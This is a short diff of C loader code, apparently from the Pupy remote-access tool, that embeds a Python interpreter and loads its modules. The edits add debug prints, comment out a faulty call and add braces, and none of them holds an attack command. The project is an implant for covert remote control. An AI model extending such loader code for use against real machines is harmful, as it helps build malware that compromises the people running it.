@@ -395,19 +395,22 @@ PyObject *py_eval_package_init(
         dprint(
             "py_eval_package_init(%s): iterate modules at %p\n", name, modules
         );
-
+        
         /* Need to find/set all childs */
         while (PyDict_Next(modules, &pos, &key, &value)) {
+            dprint("iteration: %d\n", pos);
             const char *modname = NULL;
             Py_ssize_t modname_len = 0;
-            if (PyUnicode_FromStringAndSize(key, &modname, &modname_len) < 0) {
+            /*
+            if (PyUnicode_FromStringAndSize(&modname, &modname_len) < 0) {
                 dprint(
                     "py_eval_package_init(%s) :: key at %d is not a string\n",
                     name, pos
                 );
 
                 PyErr_Clear();
-            }
+            }*/
+
             modname = PyUnicode_AsUTF8AndSize(key, &modname_len);
 
             if (! (modname && modname_len)) {
@@ -868,7 +871,6 @@ void run_pupy() {
 
     dprint("Update stdlib\n");
     PyDict_Update(py_stdlib, py_pupylib);
-
     Py_IncRef(py_config);
 
     
@@ -891,8 +893,10 @@ void run_pupy() {
     
     if (!py_module_from_stdlib(py_stdlib, "collections.abc", 0))
         goto lbExit4;
-    if (!py_module_from_stdlib(py_stdlib, "collections", 1))
+
+    if (!py_module_from_stdlib(py_stdlib, "collections", 1)){
         goto lbExit4;
+    }
     
     if (!py_module_from_stdlib(py_stdlib, "functools", 0))
         goto lbExit4;
